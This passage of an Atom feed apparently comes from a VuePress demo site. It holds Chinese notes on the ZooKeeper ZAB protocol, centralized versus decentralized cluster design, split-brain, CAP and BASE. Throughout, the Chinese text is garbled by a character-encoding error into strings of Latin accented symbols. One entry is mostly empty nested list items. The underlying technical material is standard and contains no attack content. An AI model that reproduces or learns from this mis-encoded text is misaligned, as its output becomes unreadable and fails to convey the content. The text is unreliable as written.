<p>ZABåè®®åŒ…æ‹¬ä¸¤ç§åŸºæœ¬çš„æ¨¡å¼ï¼Œåˆ†åˆ«æ˜¯ <strong>å´©æºƒæ¢å¤å’Œæ¶ˆæ¯å¹¿æ’­</strong>ã€‚å½“æ•´ä¸ªæœåŠ¡æ¡†æ¶åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œæˆ–æ˜¯å½“ Leader æœåŠ¡å™¨å‡ºç°ç½‘ç»œä¸­æ–­ã€å´©æºƒé€€å‡ºä¸é‡å¯ç­‰å¼‚å¸¸æƒ…å†µæ—¶ï¼ŒZAB åè®®å°±ä¼šè¿›äººæ¢å¤æ¨¡å¼å¹¶é€‰ä¸¾äº§ç”Ÿæ–°çš„LeaderæœåŠ¡å™¨ã€‚å½“é€‰ä¸¾äº§ç”Ÿäº†æ–°çš„ Leader æœåŠ¡å™¨ï¼ŒåŒæ—¶é›†ç¾¤ä¸­å·²ç»æœ‰è¿‡åŠçš„æœºå™¨ä¸è¯¥LeaderæœåŠ¡å™¨å®Œæˆäº†çŠ¶æ€åŒæ­¥ä¹‹åï¼ŒZABåè®®å°±ä¼šé€€å‡ºæ¢å¤æ¨¡å¼ã€‚å…¶ä¸­ï¼Œ<strong>æ‰€è°“çš„çŠ¶æ€åŒæ­¥æ˜¯æŒ‡æ•°æ®åŒæ­¥ï¼Œç”¨æ¥ä¿è¯é›†ç¾¤ä¸­å­˜åœ¨è¿‡åŠçš„æœºå™¨èƒ½å¤Ÿå’ŒLeaderæœåŠ¡å™¨çš„æ•°æ®çŠ¶æ€ä¿æŒä¸€è‡´</strong>ã€‚</p>
<p><strong>å½“é›†ç¾¤ä¸­å·²ç»æœ‰è¿‡åŠçš„FolloweræœåŠ¡å™¨å®Œæˆäº†å’ŒLeaderæœåŠ¡å™¨çš„çŠ¶æ€åŒæ­¥ï¼Œé‚£ä¹ˆæ•´ä¸ªæœåŠ¡æ¡†æ¶å°±å¯ä»¥è¿›äººæ¶ˆæ¯å¹¿æ’­æ¨¡å¼äº†ã€‚</strong> å½“ä¸€å°åŒæ ·éµå®ˆZABåè®®çš„æœåŠ¡å™¨å¯åŠ¨ååŠ äººåˆ°é›†ç¾¤ä¸­æ—¶ï¼Œå¦‚æœæ­¤æ—¶é›†ç¾¤ä¸­å·²ç»å­˜åœ¨ä¸€ä¸ªLeaderæœåŠ¡å™¨åœ¨è´Ÿè´£è¿›è¡Œæ¶ˆæ¯å¹¿æ’­ï¼Œé‚£ä¹ˆæ–°åŠ äººçš„æœåŠ¡å™¨å°±ä¼šè‡ªè§‰åœ°è¿›äººæ•°æ®æ¢å¤æ¨¡å¼ï¼šæ‰¾åˆ°Leaderæ‰€åœ¨çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸å…¶è¿›è¡Œæ•°æ®åŒæ­¥ï¼Œç„¶åä¸€èµ·å‚ä¸åˆ°æ¶ˆæ¯å¹¿æ’­æµç¨‹ä¸­å»ã€‚æ­£å¦‚ä¸Šæ–‡ä»‹ç»ä¸­æ‰€è¯´çš„ï¼ŒZooKeeperè®¾è®¡æˆåªå…è®¸å”¯ä¸€çš„ä¸€ä¸ªLeaderæœåŠ¡å™¨æ¥è¿›è¡Œäº‹åŠ¡è¯·æ±‚çš„å¤„ç†ã€‚LeaderæœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„äº‹åŠ¡è¯·æ±‚åï¼Œä¼šç”Ÿæˆå¯¹åº”çš„äº‹åŠ¡ææ¡ˆå¹¶å‘èµ·ä¸€è½®å¹¿æ’­åè®®ï¼›è€Œå¦‚æœé›†ç¾¤ä¸­çš„å…¶ä»–æœºå™¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„äº‹åŠ¡è¯·æ±‚ï¼Œé‚£ä¹ˆè¿™äº›éLeaderæœåŠ¡å™¨ä¼šé¦–å…ˆå°†è¿™ä¸ªäº‹åŠ¡è¯·æ±‚è½¬å‘ç»™LeaderæœåŠ¡å™¨ã€‚</p>
<p>å…³äº <strong>ZAB åè®®&amp;Paxosç®—æ³•</strong> éœ€è¦è®²å’Œç†è§£çš„ä¸œè¥¿å¤ªå¤šäº†ã€‚æ¨èé˜…è¯»ä¸‹é¢ä¸¤ç¯‡æ–‡ç« ï¼š</p>
<ul>
<li><a href="http://codemacro.com/2014/10/15/explain-poxos/" target="_blank" rel="noopener noreferrer">å›¾è§£ Paxos ä¸€è‡´æ€§åè®®</a></li>
<li><a href="https://dbaplus.cn/news-141-1875-1.html" target="_blank" rel="noopener noreferrer">Zookeeper ZAB åè®®åˆ†æ</a></li>
</ul>
<p>å…³äºå¦‚ä½•ä½¿ç”¨ zookeeper å®ç°åˆ†å¸ƒå¼é”ï¼Œå¯ä»¥æŸ¥çœ‹ä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š</p>
<ul>
<li></li>
</ul>
<p><a href="https://blog.csdn.net/qiangcuo6087/article/details/79067136" target="_blank" rel="noopener noreferrer">10åˆ†é’Ÿçœ‹æ‡‚ï¼åŸºäºZookeeperçš„åˆ†å¸ƒå¼é”</a></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ç®—æ³•</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%AE%97%E6%B3%95/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%AE%97%E6%B3%95/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ç³»ç»Ÿè®¾è®¡</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡ç†å¿µ</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%88%86%E5%B8%83%E5%BC%8F.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%88%86%E5%B8%83%E5%BC%8F.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡ç†å¿µ" tabindex="-1"> åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡ç†å¿µ</h1>
<h2 id="ä¸­å¿ƒåŒ–è®¾è®¡" tabindex="-1"> ä¸­å¿ƒåŒ–è®¾è®¡</h2>
<ul>
<li>ä¸¤ä¸ªè§’è‰²ï¼š ä¸­å¿ƒåŒ–çš„è®¾è®¡æ€æƒ³å¾ˆç®€å•ï¼Œåˆ†å¸ƒå¼é›†ç¾¤ä¸­çš„èŠ‚ç‚¹æœºå™¨æŒ‰ç…§è§’è‰²åˆ†å·¥ï¼Œå¤§ä½“ä¸Šåˆ†ä¸ºä¸¤ç§è§’è‰²ï¼š â€œé¢†å¯¼â€ å’Œ â€œå¹²æ´»çš„â€</li>
<li>è§’è‰²èŒè´£ï¼š â€œé¢†å¯¼â€é€šå¸¸è´Ÿè´£åˆ†å‘ä»»åŠ¡å¹¶ç›‘ç£â€œå¹²æ´»çš„â€ï¼Œå‘ç°è°å¤ªé—²äº†ï¼Œå°±æƒ³å‘è®¾æ³•åœ°ç»™å…¶å®‰æ’æ–°ä»»åŠ¡ï¼Œç¡®ä¿æ²¡æœ‰ä¸€ä¸ªâ€œå¹²æ´»çš„â€èƒ½å¤Ÿå·æ‡’ï¼Œå¦‚æœâ€œé¢†å¯¼â€å‘ç°æŸä¸ªâ€œå¹²æ´»çš„â€å› ä¸ºåŠ³ç´¯è¿‡åº¦è€Œç—…å€’äº†ï¼Œåˆ™æ˜¯ä¸ä¼šè€ƒè™‘å…ˆå°è¯•â€œåŒ»æ²»â€ä»–çš„ï¼Œè€Œæ˜¯ä¸€è„šè¸¢å‡ºå»ï¼Œç„¶åæŠŠä»–çš„ä»»åŠ¡åˆ†ç»™å…¶ä»–äººã€‚å…¶ä¸­å¾®æœåŠ¡æ¶æ„ Kubernetes å°±æ°å¥½é‡‡ç”¨äº†è¿™ä¸€è®¾è®¡æ€è·¯ã€‚</li>
</ul>
<p><strong>ä¸­å¿ƒåŒ–è®¾è®¡çš„é—®é¢˜</strong>ï¼š</p>
<ul>
<li>ä¸­å¿ƒåŒ–çš„è®¾è®¡å­˜åœ¨çš„æœ€å¤§é—®é¢˜æ˜¯â€œé¢†å¯¼â€çš„å®‰å±é—®é¢˜ï¼Œå¦‚æœâ€œé¢†å¯¼â€å‡ºäº†é—®é¢˜ï¼Œåˆ™ç¾¤é¾™æ— é¦–ï¼Œæ•´ä¸ªé›†ç¾¤å°±å¥”æºƒäº†ã€‚ä½†æˆ‘ä»¬éš¾ä»¥åŒæ—¶å®‰æ’ä¸¤ä¸ªâ€œé¢†å¯¼â€ä»¥é¿å…å•ç‚¹é—®é¢˜ã€‚</li>
<li>ä¸­å¿ƒåŒ–è®¾è®¡è¿˜å­˜åœ¨å¦å¤–ä¸€ä¸ªæ½œåœ¨çš„é—®é¢˜ï¼Œæ—¢â€œé¢†å¯¼â€çš„èƒ½åŠ›é—®é¢˜ï¼šå¯ä»¥é¢†å¯¼10ä¸ªäººé«˜æ•ˆå·¥ä½œå¹¶ä¸æ„å‘³ç€å¯ä»¥é¢†å¯¼100ä¸ªäººé«˜æ•ˆå·¥ä½œï¼Œæ‰€ä»¥å¦‚æœç³»ç»Ÿè®¾è®¡å’Œå®ç°å¾—ä¸å¥½ï¼Œé—®é¢˜å°±ä¼šå¡åœ¨â€œé¢†å¯¼â€èº«ä¸Šã€‚</li>
</ul>
<p>é¢†å¯¼å®‰å±é—®é¢˜çš„è§£å†³åŠæ³•ï¼š å¤§å¤šæ•°ä¸­å¿ƒåŒ–ç³»ç»Ÿéƒ½é‡‡ç”¨äº†ä¸»å¤‡ä¸¤ä¸ªâ€œé¢†å¯¼â€çš„è®¾è®¡æ–¹æ¡ˆï¼Œå¯ä»¥æ˜¯çƒ­å¤‡æˆ–è€…å†·å¤‡ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªåŠ¨åˆ‡æ¢æˆ–è€…æ‰‹åŠ¨åˆ‡æ¢ï¼Œè€Œä¸”è¶Šæ¥è¶Šå¤šçš„æ–°ç³»ç»Ÿéƒ½å¼€å§‹å…·å¤‡è‡ªåŠ¨é€‰ä¸¾åˆ‡æ¢â€œé¢†å¯¼â€çš„èƒ½åŠ›ï¼Œä»¥æå‡ç³»ç»Ÿçš„å¯ç”¨æ€§ã€‚</p>
<h2 id="å»ä¸­å¿ƒåŒ–è®¾è®¡" tabindex="-1"> å»ä¸­å¿ƒåŒ–è®¾è®¡</h2>
<ul>
<li><strong>ä¼—ç”Ÿåœ°ä½å¹³ç­‰</strong>ï¼šåœ¨å»ä¸­å¿ƒåŒ–çš„è®¾è®¡é‡Œï¼Œé€šå¸¸æ²¡æœ‰â€œé¢†å¯¼â€å’Œâ€œå¹²æ´»çš„â€è¿™ä¸¤ç§è§’è‰²çš„åŒºåˆ†ï¼Œå¤§å®¶çš„è§’è‰²éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåœ°ä½æ˜¯å¹³ç­‰çš„ï¼Œå…¨çƒäº’è”ç½‘å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„å»ä¸­å¿ƒåŒ–çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œè”ç½‘çš„ä»»æ„èŠ‚ç‚¹è®¾å¤‡å®•æœºï¼Œéƒ½åªä¼šå½±å“å¾ˆå°èŒƒå›´çš„åŠŸèƒ½ã€‚</li>
<li><strong>â€œå»ä¸­å¿ƒåŒ–â€ä¸æ˜¯ä¸è¦ä¸­å¿ƒï¼Œè€Œæ˜¯ç”±èŠ‚ç‚¹æ¥è‡ªç”±é€‰æ‹©ä¸­å¿ƒ</strong>ï¼šï¼ˆé›†ç¾¤çš„æˆå‘˜ä¼šè‡ªå‘çš„ä¸¾è¡Œâ€œä¼šè®®â€é€‰ä¸¾æ–°çš„â€œé¢†å¯¼â€ä¸»æŒå·¥ä½œã€‚æœ€å…¸å‹çš„æ¡ˆä¾‹å°±æ˜¯ZooKeeperåŠGoè¯­è¨€å®ç°çš„Etcdï¼‰</li>
<li><strong>å»ä¸­å¿ƒåŒ–è®¾è®¡çš„é—®é¢˜</strong>ï¼šå»ä¸­å¿ƒåŒ–è®¾è®¡é‡Œæœ€éš¾è§£å†³çš„ä¸€ä¸ªé—®é¢˜æ˜¯ â€œè„‘è£‚â€é—®é¢˜ ï¼Œè¿™ç§æƒ…å†µçš„å‘å£°æ¦‚ç‡å¾ˆä½ï¼Œä½†å½±å“å¾ˆå¤§ã€‚è„‘è£‚é—®é¢˜ï¼Œè¿™ç§æƒ…å†µçš„å‘ç”Ÿæ¦‚ç‡å¾ˆä½ï¼Œä½†å½±å“å¾ˆå¤§ã€‚è„‘è£‚æŒ‡ä¸€ä¸ªé›†ç¾¤ç”±äºç½‘ç»œçš„æ•…éšœï¼Œè¢«åˆ†ä¸ºè‡³å°‘ä¸¤ä¸ªå½¼æ­¤æ— æ³•é€šä¿¡çš„å•ç‹¬é›†ç¾¤ï¼Œæ­¤æ—¶å¦‚æœä¸¤ä¸ªé›†ç¾¤éƒ½å„è‡ªå·¥ä½œï¼Œåˆ™å¯èƒ½ä¼šäº§ç”Ÿä¸¥é‡çš„æ•°æ®å†²çªå’Œé”™è¯¯ã€‚ä¸€èˆ¬çš„è®¾è®¡æ€è·¯æ˜¯ï¼Œå½“é›†ç¾¤åˆ¤æ–­å‘ç”Ÿäº†è„‘è£‚é—®é¢˜æ—¶ï¼Œè§„æ¨¡è¾ƒå°çš„é›†ç¾¤å°±â€œè‡ªæ€â€æˆ–è€…æ‹’ç»æœåŠ¡ã€‚</li>
</ul>
<h2 id="åˆ†å¸ƒå¼ä¸é›†ç¾¤å¯¹æ¯”" tabindex="-1"> åˆ†å¸ƒå¼ä¸é›†ç¾¤å¯¹æ¯”</h2>
<ul>
<li>åˆ†å¸ƒå¼ï¼š ä¸€ä¸ªä¸šåŠ¡åˆ†æ‹†å¤šä¸ªå­ä¸šåŠ¡ï¼Œéƒ¨ç½²åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Š</li>
<li>é›†ç¾¤ï¼š åŒä¸€ä¸ªä¸šåŠ¡ï¼Œéƒ¨ç½²åœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šã€‚æ¯”å¦‚ä¹‹å‰åšç”µå•†ç½‘ç«™æ­çš„redisé›†ç¾¤ä»¥åŠsolré›†ç¾¤éƒ½æ˜¯å±äºå°†redisæœåŠ¡å™¨æä¾›çš„ç¼“å­˜æœåŠ¡ä»¥åŠsolræœåŠ¡å™¨æä¾›çš„æœç´¢æœåŠ¡éƒ¨ç½²åœ¨å¤šä¸ªæœåŠ¡å™¨ä¸Šä»¥æé«˜ç³»ç»Ÿæ€§èƒ½ã€å¹¶å‘é‡è§£å†³æµ·é‡å­˜å‚¨é—®é¢˜ã€‚</li>
</ul>
<h1 id="åˆ†å¸ƒå¼ç†è®º" tabindex="-1"> åˆ†å¸ƒå¼ç†è®º</h1>
<h2 id="cap" tabindex="-1"> CAP</h2>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä¸€è‡´æ€§ï¼ˆCï¼šConsistencyï¼‰ã€å¯ç”¨æ€§ï¼ˆAï¼šAvailabilityï¼‰å’Œåˆ†åŒºå®¹å¿æ€§ï¼ˆPï¼šPartition Toleranceï¼‰ï¼Œæœ€å¤šåªèƒ½åŒæ—¶æ»¡è¶³å…¶ä¸­ä¸¤é¡¹ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a14268b3-b937-4ffa-a34a-4cc53071686b.jpg" width="450px"> </div><br>
<h3 id="ä¸€è‡´æ€§" tabindex="-1"> ä¸€è‡´æ€§</h3>
<p>ä¸€è‡´æ€§æŒ‡çš„æ˜¯å¤šä¸ªæ•°æ®å‰¯æœ¬æ˜¯å¦èƒ½ä¿æŒä¸€è‡´çš„ç‰¹æ€§ï¼Œåœ¨ä¸€è‡´æ€§çš„æ¡ä»¶ä¸‹ï¼Œç³»ç»Ÿåœ¨æ‰§è¡Œæ•°æ®æ›´æ–°æ“ä½œä¹‹åèƒ½å¤Ÿä»ä¸€è‡´æ€§çŠ¶æ€è½¬ç§»åˆ°å¦ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚</p>
<p>å¯¹ç³»ç»Ÿçš„ä¸€ä¸ªæ•°æ®æ›´æ–°æˆåŠŸä¹‹åï¼Œå¦‚æœæ‰€æœ‰ç”¨æˆ·éƒ½èƒ½å¤Ÿè¯»å–åˆ°æœ€æ–°çš„å€¼ï¼Œè¯¥ç³»ç»Ÿå°±è¢«è®¤ä¸ºå…·æœ‰å¼ºä¸€è‡´æ€§ã€‚</p>
<h3 id="å¯ç”¨æ€§" tabindex="-1"> å¯ç”¨æ€§</h3>
<p>å¯ç”¨æ€§æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é¢å¯¹å„ç§å¼‚å¸¸æ—¶å¯ä»¥æä¾›æ­£å¸¸æœåŠ¡çš„èƒ½åŠ›ï¼Œå¯ä»¥ç”¨ç³»ç»Ÿå¯ç”¨æ—¶é—´å æ€»æ—¶é—´çš„æ¯”å€¼æ¥è¡¡é‡ï¼Œ4 ä¸ª 9 çš„å¯ç”¨æ€§è¡¨ç¤ºç³»ç»Ÿ 99.99% çš„æ—¶é—´æ˜¯å¯ç”¨çš„ã€‚</p>
<p>åœ¨å¯ç”¨æ€§æ¡ä»¶ä¸‹ï¼Œè¦æ±‚ç³»ç»Ÿæä¾›çš„æœåŠ¡ä¸€ç›´å¤„äºå¯ç”¨çš„çŠ¶æ€ï¼Œå¯¹äºç”¨æˆ·çš„æ¯ä¸€ä¸ªæ“ä½œè¯·æ±‚æ€»æ˜¯èƒ½å¤Ÿåœ¨æœ‰é™çš„æ—¶é—´å†…è¿”å›ç»“æœã€‚</p>
<h3 id="åˆ†åŒºå®¹å¿æ€§" tabindex="-1"> åˆ†åŒºå®¹å¿æ€§</h3>
<p>ç½‘ç»œåˆ†åŒºæŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹è¢«åˆ’åˆ†ä¸ºå¤šä¸ªåŒºåŸŸï¼Œæ¯ä¸ªåŒºåŸŸå†…éƒ¨å¯ä»¥é€šä¿¡ï¼Œä½†æ˜¯åŒºåŸŸä¹‹é—´æ— æ³•é€šä¿¡ã€‚</p>
<p>åœ¨åˆ†åŒºå®¹å¿æ€§æ¡ä»¶ä¸‹ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿåœ¨é‡åˆ°ä»»ä½•ç½‘ç»œåˆ†åŒºæ•…éšœçš„æ—¶å€™ï¼Œä»ç„¶éœ€è¦èƒ½å¯¹å¤–æä¾›ä¸€è‡´æ€§å’Œå¯ç”¨æ€§çš„æœåŠ¡ï¼Œé™¤éæ˜¯æ•´ä¸ªç½‘ç»œç¯å¢ƒéƒ½å‘ç”Ÿäº†æ•…éšœã€‚</p>
<h3 id="æƒè¡¡" tabindex="-1"> æƒè¡¡</h3>
<p>åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œåˆ†åŒºå®¹å¿æ€§å¿…ä¸å¯å°‘ï¼Œå› ä¸ºéœ€è¦æ€»æ˜¯å‡è®¾ç½‘ç»œæ˜¯ä¸å¯é çš„ã€‚å› æ­¤ï¼ŒCAP ç†è®ºå®é™…ä¸Šæ˜¯è¦åœ¨å¯ç”¨æ€§å’Œä¸€è‡´æ€§ä¹‹é—´åšæƒè¡¡ã€‚</p>
<p>å¯ç”¨æ€§å’Œä¸€è‡´æ€§å¾€å¾€æ˜¯å†²çªçš„ï¼Œå¾ˆéš¾ä½¿å®ƒä»¬åŒæ—¶æ»¡è¶³ã€‚åœ¨å¤šä¸ªèŠ‚ç‚¹ä¹‹é—´è¿›è¡Œæ•°æ®åŒæ­¥æ—¶ï¼Œ</p>
<ul>
<li>ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼ˆCPï¼‰ï¼Œä¸èƒ½è®¿é—®æœªåŒæ­¥å®Œæˆçš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±å¤±å»äº†éƒ¨åˆ†å¯ç”¨æ€§ï¼›</li>
<li>ä¸ºäº†ä¿è¯å¯ç”¨æ€§ï¼ˆAPï¼‰ï¼Œå…è®¸è¯»å–æ‰€æœ‰èŠ‚ç‚¹çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®å¯èƒ½ä¸ä¸€è‡´ã€‚</li>
</ul>
<h2 id="base" tabindex="-1"> BASE</h2>
<p>BASE æ˜¯åŸºæœ¬å¯ç”¨ï¼ˆBasically Availableï¼‰ã€è½¯çŠ¶æ€ï¼ˆSoft Stateï¼‰å’Œæœ€ç»ˆä¸€è‡´æ€§ï¼ˆEventually Consistentï¼‰ä¸‰ä¸ªçŸ­è¯­çš„ç¼©å†™ã€‚</p>
<p>BASE ç†è®ºæ˜¯å¯¹ CAP ä¸­ä¸€è‡´æ€§å’Œå¯ç”¨æ€§æƒè¡¡çš„ç»“æœï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå³ä½¿æ— æ³•åšåˆ°å¼ºä¸€è‡´æ€§ï¼Œä½†æ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹ç‚¹ï¼Œé‡‡ç”¨é€‚å½“çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
<h3 id="åŸºæœ¬å¯ç”¨" tabindex="-1"> åŸºæœ¬å¯ç”¨</h3>
<p>æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨å‡ºç°æ•…éšœçš„æ—¶å€™ï¼Œä¿è¯æ ¸å¿ƒå¯ç”¨ï¼Œå…è®¸æŸå¤±éƒ¨åˆ†å¯ç”¨æ€§ã€‚</p>
<p>ä¾‹å¦‚ï¼Œç”µå•†åœ¨åšä¿ƒé”€æ—¶ï¼Œä¸ºäº†ä¿è¯è´­ç‰©ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§çš„é¡µé¢ã€‚</p>
<h3 id="è½¯çŠ¶æ€" tabindex="-1"> è½¯çŠ¶æ€</h3>
<p>æŒ‡å…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œå¹¶è®¤ä¸ºè¯¥ä¸­é—´çŠ¶æ€ä¸ä¼šå½±å“ç³»ç»Ÿæ•´ä½“å¯ç”¨æ€§ï¼Œå³å…è®¸ç³»ç»Ÿä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬ä¹‹é—´è¿›è¡ŒåŒæ­¥çš„è¿‡ç¨‹å­˜åœ¨æ—¶å»¶ã€‚</p>
<h3 id="æœ€ç»ˆä¸€è‡´æ€§" tabindex="-1"> æœ€ç»ˆä¸€è‡´æ€§</h3>
<p>æœ€ç»ˆä¸€è‡´æ€§å¼ºè°ƒçš„æ˜¯ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®å‰¯æœ¬ï¼Œåœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„åŒæ­¥åï¼Œæœ€ç»ˆèƒ½è¾¾åˆ°ä¸€è‡´çš„çŠ¶æ€ã€‚</p>
<p>ACID è¦æ±‚å¼ºä¸€è‡´æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨ä¼ ç»Ÿçš„æ•°æ®åº“ç³»ç»Ÿä¸Šã€‚è€Œ BASE è¦æ±‚æœ€ç»ˆä¸€è‡´æ€§ï¼Œé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥è¾¾åˆ°å¯ç”¨æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ã€‚</p>
<p>åœ¨å®é™…çš„åˆ†å¸ƒå¼åœºæ™¯ä¸­ï¼Œä¸åŒä¸šåŠ¡å•å…ƒå’Œç»„ä»¶å¯¹ä¸€è‡´æ€§çš„è¦æ±‚æ˜¯ä¸åŒçš„ï¼Œå› æ­¤ ACID å’Œ BASE å¾€å¾€ä¼šç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚</p>
<h2 id="ä¸€è‡´æ€§æ¨¡å‹" tabindex="-1"> ä¸€è‡´æ€§æ¨¡å‹</h2>
<p>åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸€ä¸ªé‡è¦çš„é—®é¢˜å°±æ˜¯æ•°æ®å¤åˆ¶ï¼Œæ•°æ®å¤åˆ¶ä¸€èˆ¬æ˜¯ä¸ºäº†å¢å¼ºç³»ç»Ÿçš„å¯ç”¨æ€§æˆ–æé«˜æ€§èƒ½ã€‚ä½†æ˜¯æ•°æ®å¤åˆ¶æ˜¯è¦ä»˜å‡ºä»£ä»·çš„ã€‚æ•°æ®å¤åˆ¶å¸¦æ¥äº†å¤šå‰¯æœ¬æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ã€‚</p>
<p>ä¸€è‡´æ€§æ¨¡å‹æœ¬è´¨ä¸Šæ˜¯è¿›ç¨‹ä¸æ•°æ®å­˜å‚¨çš„çº¦å®šï¼Œæä¾›äº†åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ•°æ®å¤åˆ¶æ—¶ä¿æŒä¸€è‡´æ€§çš„çº¦æŸã€‚</p>
<p>ä¸€ä¸ªå‰¯æœ¬çš„æ•°æ®æ›´æ–°ä¹‹åï¼Œå…¶ä»–å‰¯æœ¬å¿…é¡»è¦ä¿æŒåŒæ­¥ï¼Œå¦åˆ™æ•°æ®ä¸ä¸€è‡´å°±å¯èƒ½å¯¼è‡´ä¸šåŠ¡å‡ºç°é—®é¢˜ã€‚å› æ­¤ï¼Œæ¯æ¬¡æ›´æ–°æ•°æ®å¯¹æ‰€æœ‰å‰¯æœ¬è¿›è¡Œä¿®æ”¹çš„æ—¶é—´ä»¥åŠæ–¹å¼å†³å®šäº†å¤åˆ¶ä»£ä»·çš„å¤§å°ã€‚å…¨å±€åŒæ­¥ä¸æ€§èƒ½å®é™…ä¸Šæ˜¯çŸ›ç›¾çš„ï¼Œè€Œä¸ºäº†æé«˜æ€§èƒ½ï¼Œå¾€å¾€ä¼šé‡‡ç”¨æ”¾å®½ä¸€è‡´æ€§è¦æ±‚çš„æ–¹æ³•ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ä¸€è‡´æ€§æ¨¡å‹æ¥ç†è§£å’Œæ¨ç†åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­æ•°æ®å¤åˆ¶éœ€è¦è€ƒè™‘çš„é—®é¢˜å’ŒåŸºæœ¬å‡è®¾ã€‚</p>
<h3 id="å¼ºä¸€è‡´æ€§" tabindex="-1"> å¼ºä¸€è‡´æ€§</h3>
